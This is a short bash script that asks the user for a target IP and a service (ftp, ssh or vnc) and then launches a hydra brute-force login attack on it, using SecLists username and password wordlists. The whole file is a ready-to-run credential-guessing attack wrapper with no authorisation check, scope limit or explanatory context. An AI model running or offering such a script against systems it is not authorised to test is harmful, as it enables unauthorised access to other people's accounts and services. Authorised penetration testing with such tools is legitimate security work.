#! /bin/bash

echo Please choose a target IP
read target
echo Please choose a service /ftp, ssh, vnc
read service

hydra -v -L $HOME/Desktop/Tools/SecLists/Usernames/top_shortlist.txt -P $HOME/Desktop/Tools/SecLists/Passwords/10_million_password_list_top_100000.txt $service://$target


